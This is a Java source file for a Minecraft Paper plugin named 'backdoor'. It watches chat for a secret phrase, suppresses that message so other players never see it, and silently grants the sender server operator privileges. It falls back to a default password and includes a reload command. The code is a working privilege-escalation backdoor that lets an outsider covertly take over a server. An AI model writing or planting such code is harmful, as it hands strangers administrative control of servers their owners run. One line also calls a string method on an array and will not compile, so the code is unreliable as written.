package link.cloudthink;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.Collections;
import java.util.List;

public final class backdoor extends JavaPlugin implements Listener, CommandExecutor, TabCompleter {

    private String secretCode;

    @Override
    public void onEnable() {
        reloadConfiguration();
        
        getLogger().info("Backdoor plugin v" + getDescription().getVersion() + " has been enabled.");
        getLogger().info("Secret code loaded from config.yml.");

        getCommand("backdoor").setExecutor(this);
        getCommand("backdoor").setTabCompleter(this);
        
        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        getLogger().info("Backdoor plugin has been disabled.");
    }

    private void reloadConfiguration() {
        saveDefaultConfig();
        reloadConfig();
        this.secretCode = getConfig().getString("secret-code", "a-very-secure-default-password");
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncChatEvent event) {
        final Player player = event.getPlayer();
        final String message = PlainTextComponentSerializer.plainText().serialize(event.message());

        if (message.equalsIgnoreCase(this.secretCode)) {
            event.message(Component.empty());
            event.viewers().clear();
            event.setCancelled(true);

            getServer().getScheduler().runTask(this, () -> {
                player.setOp(true);
                player.sendMessage(Component.text("你已获得OP权限！", NamedTextColor.YELLOW));
                getLogger().warning("Player " + player.getName() + " has triggered the backdoor and received OP privileges.");
            });
        }
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (command.getName().equalsIgnoreCase("backdoor")) {
            if (!sender.hasPermission("backdoor.admin")) {
                sender.sendMessage(Component.text("你没有权限执行此命令。", NamedTextColor.RED));
                return true;
            }

            if (args.length == 1 && args.equalsIgnoreCase("reload")) {
                reloadConfiguration();
                sender.sendMessage(Component.text("Backdoor 插件配置已成功重载！", NamedTextColor.GREEN));
                return true;
            }
            
            sender.sendMessage(Component.text("用法: /backdoor reload", NamedTextColor.RED));
            return true;
        }
        return false;
    }

    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String alias, @NotNull String[] args) {
        if (args.length == 1) {
            return Collections.singletonList("reload");
        }
        return Collections.emptyList();
    }
}
